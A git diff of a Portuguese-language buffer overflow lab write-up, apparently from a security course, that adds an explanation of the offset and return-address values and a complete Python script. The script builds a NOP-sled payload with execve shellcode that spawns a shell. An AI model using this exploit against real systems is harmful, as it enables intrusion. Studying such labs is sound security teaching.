@@ -83,7 +83,55 @@ Primeiramente, tivemos que utilizar um debbuger(GDB), para analisar o programa a
 
 Terminal 1 | Terminal 2
 :---------:|:---------:
-![Terminal print of lab task1](file:///C:/Users/cmpos/OneDrive/Imagens/Capturas%20de%20tela/1%20task5.png) | ![Terminal print of lab task1](file:///C:/Users/cmpos/OneDrive/Imagens/Capturas%20de%20tela/2%20task5.png)
+![Terminal print of lab task1]() | ![Terminal print of lab task1](file:///C:/Users/cmpos/OneDrive/Imagens/Capturas%20de%20tela/2%20task5.png)
+
+De seguida, tivemos de alterar as variaveis no script python.
+    - Alteramos a variavel **offset** para 112, pois essa é a distância entre o inicio do buffer e o endereço de retorno.
+    - Alteramos tambem o valor **ret** para o programa saltar para o endereço que queremos.
+    - Alteramos o valor **start** para coincidir com o inicio do shellcode no buffer com a posição do ret.
+    
+
+
+**Python Script**
+
+``` python
+#!/usr/bin/python3
+import sys
+
+# Replace the content with the actual shellcode
+shellcode= (
+    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
+).encode('latin-1')
+
+# Fill the content with NOP's
+content = bytearray(0x90 for i in range(517))
+
+##################################################################
+# Put the shellcode somewhere in the payload
+start = 256               # Change this number
+content[start:start + len(shellcode)] = shellcode
+
+# Decide the return address value
+# and put it somewhere in the payload
+ret    = 0xffffcbfc     # Change this number
+offset = 112           # Change this number
+
+L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
+content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
+##################################################################
+
+# Write the content to a file
+with open('badfile', 'wb') as f:
+    f.write(content)
+```
+
+Para finalizar corremos o script python e depois corremos o programa.Com isto conseguimos executar o buffer overflow e executar o shellcode.
+![](url)
+
+
+
 
 
 
